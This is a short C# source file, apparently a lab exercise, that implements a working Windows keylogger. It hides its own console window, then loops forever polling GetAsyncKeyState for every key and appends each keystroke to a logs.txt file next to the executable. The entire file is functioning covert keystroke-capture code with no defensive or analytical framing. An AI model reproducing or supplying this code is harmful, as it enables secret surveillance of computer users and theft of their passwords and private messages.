using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace L4_1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            // key logs are being saved in logs.txt in the folder with .exe file
            // it is ...\L4-1\L4-1\bin\Debug\netcoreapp3.1 in my (and probably every) case

            string filePath = Environment.CurrentDirectory + @"\logs.txt";                       
            var handle = GetConsoleWindow();                         
            ShowWindow(handle, SW_HIDE);
          
            while (true)
            {
                Thread.Sleep(50);
                for (int i = 8; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {                      
                        File.AppendAllText(filePath, ((System.ConsoleKey)i).ToString());
                    }
                }
            }
        }
    }
}
